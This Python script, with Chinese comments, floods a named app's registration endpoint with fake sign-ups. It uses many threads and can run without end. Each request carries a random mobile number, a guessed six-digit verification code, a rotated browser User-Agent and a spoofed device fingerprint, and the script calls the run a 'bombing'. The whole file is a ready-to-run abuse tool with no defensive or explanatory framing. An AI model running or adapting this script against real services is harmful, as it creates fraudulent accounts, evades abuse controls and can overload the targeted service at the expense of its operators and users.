import requests
import json
import time
import random
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed

def generate_random_mobile():
    """生成随机手机号"""
    # 中国大陆手机号码前缀
    prefixes = ['130', '131', '132', '133', '134', '135', '136', '137', '138', '139',
                '150', '151', '152', '153', '155', '156', '157', '158', '159',
                '180', '181', '182', '183', '184', '185', '186', '187', '188', '189']

    prefix = random.choice(prefixes)
    suffix = ''.join([str(random.randint(0, 9)) for _ in range(8)])
    return prefix + suffix

def generate_random_code():
    """生成随机验证码"""
    return ''.join([str(random.randint(0, 9)) for _ in range(6)])


# 定义 User-Agent 列表，用于模拟不同的浏览器请求
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36'
]

def register_user_with_delay(delay):
    """带延迟的注册函数"""
    # 如果有延迟，则先等待
    if delay > 0:
        time.sleep(delay)

    return register_user()

def register_user():
    url = "http://mitt0724.passjazz723.live/user/index"

    headers = {
        "Token": "",
        "user-agent": random.choice(user_agents),
        "Content-Type": "application/json",
        "Host": "mitt0724.passjazz723.live",
        "Connection": "keep-alive",
        "Accept-Encoding": "gzip, deflate, br"
    }

    # 随机生成手机号和验证码
    random_mobile = generate_random_mobile()
    random_code = generate_random_code()

    print(f"构造的手机号: {random_mobile}")
    print(f"构造的验证码: {random_code}")

    # 构造请求数据
    payload = {
        "deviceId": "7AFE89194F5931BDDAAF74B45EC34D38",
        "info": json.dumps({
            "SDKVersion": "",
            "appId": "__UNI__614011F",
            "appLanguage": "zh-Hans",
            "appName": "蜜糖",
            "appVersion": "1.0.4",
            "appVersionCode": 103,
            "appWgtVersion": "1.0.4",
            "brand": "huawei",
            "browserName": "chrome",
            "browserVersion": "92.0.4515.105",
            "deviceBrand": "huawei",
            "deviceId": "7AFE89194F5931BDDAAF74B45EC34D38",
            "deviceModel": "JKM-AL00b",
            "deviceOrientation": "portrait",
            "devicePixelRatio": 3,
            "deviceType": "phone",
            "errMsg": "getSystemInfoSync:ok",
            "isUniAppX": False,
            "language": "zh-CN",
            "model": "JKM-AL00b",
            "oaid": "dbfdcc7f-ff7f-20dc-febe-ffafffc979f0",
            "osAndroidAPILevel": 28,
            "osLanguage": "zh-CN",
            "osName": "android",
            "osTheme": "light",
            "osVersion": "9",
            "pixelRatio": 3,
            "platform": "android",
            "romName": "HarmonyOS",
            "romVersion": "2.0.0",
            "safeArea": {
                "left": 0,
                "right": 360,
                "top": 28,
                "bottom": 741,
                "width": 360,
                "height": 713
            },
            "safeAreaInsets": {
                "top": 28,
                "right": 0,
                "bottom": 0,
                "left": 0
            },
            "screenHeight": 741,
            "screenWidth": 360,
            "statusBarHeight": 28,
            "system": "Android 9",
            "ua": "Mozilla/5.0 (Linux; Android 9; JKM-AL00b Build/HUAWEIJKM-AL00b; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 uni-app (Immersed/28.333334)",
            "uniCompileVersion": "4.65",
            "uniCompilerVersion": "4.65",
            "uniPlatform": "app",
            "uniRuntimeVersion": "4.65",
            "version": "1.9.9.82412",
            "windowBottom": 0,
            "windowHeight": 741,
            "windowTop": 0,
            "windowWidth": 360
        }),
        "osname": "Android 9",
        "mobile": random_mobile,
        "lng": 116.250489,
        "lat": 36.848995,
        "code": random_code
    }

    try:
        response = requests.post(url, headers=headers, json=payload)
        print("请求状态码:", response.status_code)

        if response.status_code == 200:
            # 检查响应内容类型
            content_type = response.headers.get('Content-Type', '')

            # 如果是HTML内容，可能是"提交次数超标"的提示
            if 'text/html' in content_type:
                print(f"注册失败: {response.text.strip()}")
                return False

            # 尝试解析JSON响应
            try:
                result = response.json()
            except json.JSONDecodeError:
                print(f"JSON解析失败，响应内容: {response.text}")
                return False

            if result.get("code") == 1:
                print("注册成功!")
                data = result["data"]
                userinfo = result["data"]["userinfo"]
                token = userinfo["token"]
                print(f"获取到的Token: {token}")
                return True
            else:
                print(f"注册失败: {result.get('msg')}")
                return False
        else:
            print("请求失败")
            return False

    except Exception as e:
        print(f"请求过程中发生错误: {e}")
        return False

def bomb_register_threaded(count=10, delay=1, max_threads=10):
    """
    使用多线程发送注册请求，一开始就使用最大线程数，但每个请求之间保持间隔时间

    Args:
        count (int or bool): 发送请求的次数，如果为True则持续发送请求
        delay (int): 每次请求之间的延迟（秒），默认1秒
        max_threads (int): 最大线程数，默认10个线程
    """
    success_count = 0
    fail_count = 0

    # 判断是否持续发送请求
    infinite_mode = count is True
    request_count = count if isinstance(count, int) else 0

    if infinite_mode:
        print(f"开始持续发送注册请求，每次间隔 {delay} 秒，最大线程数 {max_threads}")
    else:
        print(f"开始发送注册请求轰炸，总共 {request_count} 次，每次间隔 {delay} 秒，最大线程数 {max_threads}")
    print("=" * 50)

    start_time = time.time()

    # 使用线程池执行器
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        if infinite_mode:
            # 持续发送请求的模式
            futures = {}
            task_index = 0

            # 首先提交一批任务
            for i in range(max_threads):
                delay_for_this_request = i * delay
                future = executor.submit(register_user_with_delay, delay_for_this_request)
                futures[future] = task_index
                task_index += 1

            # 持续监控和提交新任务
            while True:
                # 检查已完成的任务
                for future in as_completed(list(futures.keys()), timeout=1):
                    index = futures.pop(future)
                    try:
                        result = future.result()
                        if result:
                            success_count += 1
                        else:
                            fail_count += 1
                        print(f"第 {index+1} 次请求完成")
                    except Exception as e:
                        print(f"第 {index+1} 次请求发生异常: {e}")
                        fail_count += 1

                    # 提交一个新的任务来替代完成的任务
                    new_future = executor.submit(register_user_with_delay, 0)
                    futures[new_future] = task_index
                    task_index += 1

                # 每100次请求输出一次统计信息
                if task_index % 100 == 0:
                    current_time = time.time()
                    elapsed_time = current_time - start_time
                    print(f"已发送 {task_index} 次请求，成功 {success_count} 次，失败 {fail_count} 次，耗时 {elapsed_time:.2f} 秒")
        else:
            # 固定次数发送请求的模式
            futures = []
            for i in range(request_count):
                # 计算每个请求应该等待的时间，以保持整体间隔
                delay_for_this_request = i * delay
                future = executor.submit(register_user_with_delay, delay_for_this_request)
                futures.append((future, i))

            # 处理完成的任务
            for future, index in futures:
                try:
                    result = future.result()
                    if result:
                        success_count += 1
                    else:
                        fail_count += 1
                    print(f"第 {index+1} 次请求完成")
                except Exception as e:
                    print(f"第 {index+1} 次请求发生异常: {e}")
                    fail_count += 1

    end_time = time.time()
    elapsed_time = end_time - start_time

    print("=" * 50)
    print("轰炸完成!")
    print(f"总耗时: {elapsed_time:.2f} 秒")
    print(f"成功次数: {success_count}")
    print(f"失败次数: {fail_count}")

if __name__ == "__main__":
    # 当count=True时持续发送请求，每次间隔5秒，最多使用15个线程
    bomb_register_threaded(count=15, delay=0, max_threads=15)
